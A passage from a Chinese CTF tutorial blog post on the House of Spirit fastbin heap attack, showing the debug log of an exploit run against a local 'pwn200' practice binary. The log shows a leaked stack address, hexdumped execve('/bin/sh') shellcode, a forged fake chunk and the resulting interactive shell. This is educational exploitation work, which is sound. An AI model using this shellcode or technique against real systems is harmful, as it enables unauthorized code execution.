<h3 id="Debug-日志"><a href="#Debug-日志" class="headerlink" title="Debug 日志"></a>Debug 日志</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line">➜  House Of Spirit python <span class="built_in">exp</span>.py</span><br><span class="line">[*] <span class="string">&#x27;/home/ubuntu/Desktop/fastbin_attack/House Of Spirit/pwn200&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x400000</span>)</span></span></span><br><span class="line"><span class="function">    RWX:      Has RWX segments</span></span><br><span class="line"><span class="function">[*] &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span></span><br><span class="line"><span class="function">    Arch:     amd64-64-little</span></span><br><span class="line"><span class="function">    RELRO:    Partial RELRO</span></span><br><span class="line"><span class="function">    Stack:    Canary found</span></span><br><span class="line"><span class="function">    NX:       NX enabled</span></span><br><span class="line"><span class="function">    PIE:      PIE enabled</span></span><br><span class="line"><span class="function">[!] Could <span class="keyword">not</span> find executable &#x27;pwn200&#x27; in $PATH, <span class="keyword">using</span> &#x27;./pwn200&#x27; instead</span></span><br><span class="line"><span class="function">[+] Starting local process &#x27;./pwn200&#x27; argv</span>=[<span class="string">&#x27;pwn200&#x27;</span>] : pid <span class="number">18155</span></span><br><span class="line">[DEBUG] Received <span class="number">0xb</span> bytes:</span><br><span class="line">    <span class="string">&#x27;who are u?\n&#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x30</span> bytes:</span><br><span class="line">    <span class="string">&#x27;a&#x27;</span> * <span class="number">0x30</span></span><br><span class="line">[DEBUG] Received <span class="number">0x5e</span> bytes:</span><br><span class="line">    <span class="number">00000000</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  │aaaa│aaaa│aaaa│aaaa│</span><br><span class="line">    *</span><br><span class="line">    <span class="number">00000030</span>  <span class="number">80</span> fc e4 ce  fe <span class="number">7f</span> <span class="number">2</span>c <span class="number">20</span>  <span class="number">77</span> <span class="number">65</span> <span class="number">6</span>c <span class="number">63</span>  <span class="number">6f</span> <span class="number">6</span>d <span class="number">65</span> <span class="number">20</span>  │····│··, │welc│ome │</span><br><span class="line">    <span class="number">00000040</span>  <span class="number">74</span> <span class="number">6f</span> <span class="number">20</span> <span class="number">49</span>  <span class="number">53</span> <span class="number">43</span> <span class="number">43</span> <span class="number">7</span>e  <span class="number">20</span> <span class="number">0</span>a <span class="number">67</span> <span class="number">69</span>  <span class="number">76</span> <span class="number">65</span> <span class="number">20</span> <span class="number">6</span>d  │to I│SCC~│ ·gi│ve m│</span><br><span class="line">    <span class="number">00000050</span>  <span class="number">65</span> <span class="number">20</span> <span class="number">79</span> <span class="number">6f</span>  <span class="number">75</span> <span class="number">72</span> <span class="number">20</span> <span class="number">69</span>  <span class="number">64</span> <span class="number">20</span> <span class="number">7</span>e <span class="number">7</span>e  <span class="number">3f</span> <span class="number">0</span>a        │e yo│ur i│d ~~│?·│</span><br><span class="line">    <span class="number">0000005</span>e</span><br><span class="line">[+] RBP <span class="keyword">register</span> ===&gt; <span class="number">0x7ffecee4fc80</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x3</span> bytes:</span><br><span class="line">    <span class="string">&#x27;31\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0xf</span> bytes:</span><br><span class="line">    <span class="string">&#x27;give me money~\n&#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x40</span> bytes:</span><br><span class="line">    <span class="number">00000000</span>  <span class="number">00</span> <span class="number">31</span> f6 <span class="number">48</span>  bb <span class="number">2f</span> <span class="number">62</span> <span class="number">69</span>  <span class="number">6</span>e <span class="number">2f</span> <span class="number">2f</span> <span class="number">73</span>  <span class="number">68</span> <span class="number">56</span> <span class="number">53</span> <span class="number">54</span>  │·<span class="number">1</span>·H│·/bi│n<span class="comment">//s│hVST│</span></span><br><span class="line">    <span class="number">00000010</span>  <span class="number">5f</span> <span class="number">6</span>a <span class="number">3b</span> <span class="number">58</span>  <span class="number">31</span> d2 <span class="number">0f</span> <span class="number">05</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  │_j;X│<span class="number">1</span>···│····│····│</span><br><span class="line">    <span class="number">00000020</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">41</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  │····│····│A···│····│</span><br><span class="line">    <span class="number">00000030</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  f0 fb e4 ce  fe <span class="number">7f</span> <span class="number">00</span> <span class="number">00</span>  │····│····│····│····│</span><br><span class="line">    <span class="number">00000040</span></span><br><span class="line">[DEBUG] Received <span class="number">0x4d</span> bytes:</span><br><span class="line">    <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;=======EASY HOTEL========\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;1. check in\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;2. check out\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;3. goodbye\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;your choice : &#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line">    <span class="string">&#x27;2\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x52</span> bytes:</span><br><span class="line">    <span class="string">&#x27;out~\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;=======EASY HOTEL========\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;1. check in\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;2. check out\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;3. goodbye\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;your choice : &#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line">    <span class="string">&#x27;1\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0xa</span> bytes:</span><br><span class="line">    <span class="string">&#x27;how long?\n&#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x3</span> bytes:</span><br><span class="line">    <span class="string">&#x27;48\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x19</span> bytes:</span><br><span class="line">    <span class="string">&#x27;give me more money : \n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;48\n&#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x20</span> bytes:</span><br><span class="line">    <span class="number">00000000</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  │····│····│····│····│</span><br><span class="line">    <span class="number">00000010</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  c1 fb e4 ce  fe <span class="number">7f</span> <span class="number">00</span> <span class="number">00</span>  │····│····│····│····│</span><br><span class="line">    <span class="number">00000020</span></span><br><span class="line">[DEBUG] Received <span class="number">0x51</span> bytes:</span><br><span class="line">    <span class="string">&#x27;in~\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;=======EASY HOTEL========\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;1. check in\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;2. check out\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;3. goodbye\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;your choice : &#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line">    <span class="string">&#x27;3\n&#x27;</span></span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">[DEBUG] Received <span class="number">0xa</span> bytes:</span><br><span class="line">    <span class="string">&#x27;good bye~\n&#x27;</span></span><br><span class="line">good bye~</span><br><span class="line">$ ls</span><br><span class="line">[DEBUG] Sent <span class="number">0x3</span> bytes:</span><br><span class="line">    <span class="string">&#x27;ls\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x1b</span> bytes:</span><br><span class="line">    <span class="string">&#x27;exp.py\tpwn200\ttest  test.c\n&#x27;</span></span><br><span class="line"><span class="built_in">exp</span>.py    pwn200    test  test.c</span><br><span class="line">$ id</span><br><span class="line">[DEBUG] Sent <span class="number">0x3</span> bytes:</span><br><span class="line">    <span class="string">&#x27;id\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x81</span> bytes:</span><br><span class="line">    <span class="string">&#x27;uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)\n&#x27;</span></span><br><span class="line">uid=<span class="number">1000</span>(ubuntu) gid=<span class="number">1000</span>(ubuntu) groups=<span class="number">1000</span>(ubuntu),<span class="number">4</span>(adm),<span class="number">24</span>(cdrom),<span class="number">27</span>(sudo),<span class="number">30</span>(dip),<span class="number">46</span>(plugdev),<span class="number">113</span>(lpadmin),<span class="number">128</span>(sambashare)</span><br><span class="line">$ whoami</span><br><span class="line">[DEBUG] Sent <span class="number">0x7</span> bytes:</span><br><span class="line">    <span class="string">&#x27;whoami\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x7</span> bytes:</span><br><span class="line">    <span class="string">&#x27;ubuntu\n&#x27;</span></span><br><span class="line">ubuntu</span><br><span class="line">$</span><br></pre></td></tr></table></figure>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Cyberangel</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://cyberangel.cn/2020/10/21/PWN%E5%85%A5%E9%97%A8%EF%BC%883-10-2%EF%BC%89-fastbin_attack%E4%B8%AD%E7%9A%84House%20of%20Spirit%EF%BC%88%E4%BE%8B%E9%A2%98%EF%BC%89/">https://cyberangel.cn/2020/10/21/PWN入门（3-10-2）-fastbin_attack中的House of Spirit（例题）/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://cyberangel.cn" target="_blank">Cyberangel-blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://uploadstatic.mihoyo.com/contentweb/20191114/2019111411181222865.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button button--animated"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.png" target="_blank"><img class="post-qr-code-img" src="/img/wechat.png" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li><li class="reward-item"><a href="/img/alipay.png" target="_blank"><img class="post-qr-code-img" src="/img/alipay.png" alt="alipay"/></a><div class="post-qr-code-desc">alipay</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2020/10/28/%E4%B8%80%E4%B8%AA%E6%9C%89%E6%84%8F%E6%80%9D%E7%9A%84%E7%A8%8B%E5%BA%8F/"><img class="prev-cover" src="https://uploadstatic.mihoyo.com/contentweb/20191114/2019111411181222865.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">一个有意思的程序</div></div></a></div><div class="next-post pull-right"><a href="/2020/10/18/PWN%E5%85%A5%E9%97%A8%EF%BC%883-9-1%EF%BC%89--%E4%B8%8Emalloc%E3%80%81free%E6%9C%89%E5%85%B3%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/"><img class="next-cover" src="https://uploadstatic.mihoyo.com/contentweb/20191114/2019111411181222865.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">PWN入门（3-9-1）--与malloc、free有关的格式化字符串漏洞</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C"><span class="toc-number">1.</span> <span class="toc-text">准备工作</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#IDA-%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">IDA 静态分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#main-%E5%87%BD%E6%95%B0"><span class="toc-number">2.1.</span> <span class="toc-text">main 函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#main-gt-sub-400A8E"><span class="toc-number">2.2.</span> <span class="toc-text">main-&gt;sub_400A8E</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#main-gt-sub-400A8E-gt-sub-4007DF"><span class="toc-number">2.3.</span> <span class="toc-text">main-&gt;sub_400A8E-&gt;sub_4007DF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#main-gt-sub-400A8E-gt-sub-400A29"><span class="toc-number">2.4.</span> <span class="toc-text">main-&gt;sub_400A8E-&gt;sub_400A29</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#main-gt-sub-400A8E-gt-sub-400A29-gt-sub-4009C4"><span class="toc-number">2.5.</span> <span class="toc-text">main-&gt;sub_400A8E-&gt;sub_400A29-&gt;sub_4009C4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#main-gt-sub-400A8E-gt-sub-400A29-gt-sub-4009C4-gt-sub-4009AF"><span class="toc-number">2.6.</span> <span class="toc-text">main-&gt;sub_400A8E-&gt;sub_400A29-&gt;sub_4009C4-&gt;sub_4009AF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#main-gt-sub-400A8E-gt-sub-400A29-gt-sub-4009C4-gt-sub-4007DF"><span class="toc-number">2.7.</span> <span class="toc-text">main-&gt;sub_400A8E-&gt;sub_400A29-&gt;sub_4009C4-&gt;sub_4007DF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#main-gt-sub-400A8E-gt-sub-400A29-gt-sub-4009C4-gt-sub-40096D"><span class="toc-number">2.8.</span> <span class="toc-text">main-&gt;sub_400A8E-&gt;sub_400A29-&gt;sub_4009C4-&gt;sub_40096D</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#main-gt-sub-400A8E-gt-sub-400A29-gt-sub-4009C4-gt-sub-4008B7"><span class="toc-number">2.9.</span> <span class="toc-text">main-&gt;sub_400A8E-&gt;sub_400A29-&gt;sub_4009C4-&gt;sub_4008B7</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pwndbg-%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">pwndbg 动态分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%86%E8%A7%A3%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%86%85%E5%AD%98%E5%88%86%E5%B8%83"><span class="toc-number">3.1.</span> <span class="toc-text">了解程序的内存分布</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-number">3.2.</span> <span class="toc-text">exp</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-%E8%AE%B2%E8%A7%A3"><span class="toc-number">3.2.1.</span> <span class="toc-text">exp 讲解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="toc-number">3.2.2.</span> <span class="toc-text">利用思路</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E5%8A%A0%E8%BD%BD%E5%8F%8A%E7%A8%8B%E5%BA%8F%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E8%87%AA%E5%8A%A8%E5%8C%96"><span class="toc-number">3.2.2.1.</span> <span class="toc-text">程序加载及程序输入输出自动化</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2-sub-400A8E-%E7%9A%84%E6%A0%88%E5%BA%95"><span class="toc-number">3.2.2.2.</span> <span class="toc-text">泄露 sub_400A8E 的栈底</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BC%AA%E9%80%A0-fake-chunk"><span class="toc-number">3.2.2.3.</span> <span class="toc-text">伪造 fake_chunk</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C%E7%99%BB%E5%87%BA%E6%93%8D%E4%BD%9C"><span class="toc-number">3.2.2.4.</span> <span class="toc-text">执行登出操作</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C%E7%99%BB%E5%BD%95%E6%93%8D%E4%BD%9C"><span class="toc-number">3.2.2.5.</span> <span class="toc-text">执行登录操作</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E8%80%83"><span class="toc-number">3.2.3.</span> <span class="toc-text">思考</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93"><span class="toc-number">3.2.4.</span> <span class="toc-text">思路总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Debug-%E6%97%A5%E5%BF%97"><span class="toc-number">3.2.5.</span> <span class="toc-text">Debug 日志</span></a></li></ol></li></ol></li></ol></div></div></div></div></main><footer id="footer" style="background-image: url('https://uploadstatic.mihoyo.com/contentweb/20191114/2019111411181222865.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2021 By Cyberangel</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">为世界上所有美好而战！！！</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="font-plus" type="button" title="放大字体"><i class="fas fa-plus"></i></button><button id="font-minus" type="button" title="缩小字体"><i class="fas fa-minus"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat_btn" type="button" title="rightside.chat_btn"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>function loadDisqus () {
  var disqus_config = function () {
    this.page.url = 'https://cyberangel.cn/2020/10/21/PWN%E5%85%A5%E9%97%A8%EF%BC%883-10-2%EF%BC%89-fastbin_attack%E4%B8%AD%E7%9A%84House%20of%20Spirit%EF%BC%88%E4%BE%8B%E9%A2%98%EF%BC%89/'
    this.page.identifier = '2020/10/21/PWN入门（3-10-2）-fastbin_attack中的House of Spirit（例题）/'
    this.page.title = 'PWN入门（3-10-2）-fastbin_attack中的House of Spirit（例题）'
  };

  window.disqusReset = () => {
    DISQUS.reset({
      reload: true,
      config: disqus_config
    })
  }

  if (window.DISQUS) disqusReset()
  else {
    (function() { 
      var d = document, s = d.createElement('script');
      s.src = 'https://.disqus.com/embed.js';
      s.setAttribute('data-timestamp', +new Date());
      (d.head || d.body).appendChild(s);
    })();
  }
}

if ('Disqus' === 'Disqus' || !false) {
  if (false) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
  else loadDisqus()
} else {
  function loadOtherComment () {
    loadDisqus()
  }
}
</script><script>if (window.DISQUSWIDGETS === undefined) {
  var d = document, s = d.createElement('script');
  s.src = 'https://.disqus.com/count.js';
  s.id = 'dsq-count-scr';
  (d.head || d.body).appendChild(s);
} else {
  DISQUSWIDGETS.getCount({reset: true});
}</script></div><canvas class="fireworks" mobile="true"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="false"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = true;
POWERMODE.mobile = true;
document.body.addEventListener('input', POWERMODE);
</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>